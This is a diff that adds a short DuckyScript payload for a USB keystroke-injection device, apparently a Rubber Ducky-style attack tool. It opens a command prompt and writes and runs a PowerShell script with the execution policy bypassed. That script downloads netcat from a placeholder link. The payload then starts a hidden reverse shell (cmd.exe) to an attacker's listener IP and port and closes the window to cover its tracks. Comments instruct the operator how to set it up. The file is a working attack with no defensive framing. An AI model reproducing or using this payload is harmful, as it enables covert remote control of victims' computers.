@@ -1,0 +1,25 @@
+DELAY 400
+GUI r
+DELAY 100
+
+STRING cmd
+ENTER
+DELAY 100
+
+STRING cd / & mkdir win & cd win 
+ENTER
+DELAY 400
+REM You should download netcat.exe and copy the direct download link and place it below
+STRING echo (wget '[NETCAT LINK]' -OutFile a.exe) > b.PS1
+ENTER
+DELAY 400
+STRING powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 5000
+
+REM LISTENER IP is the IP of the host and port is whatever port you want
+REM execute on the host pc, netcat -lp [PORT] and wait for the target PC to connect
+STRING a.exe [LISTENER IP] [PORT] -e cmd.exe -d
+ENTER
+DELAY 500
+ALT F4
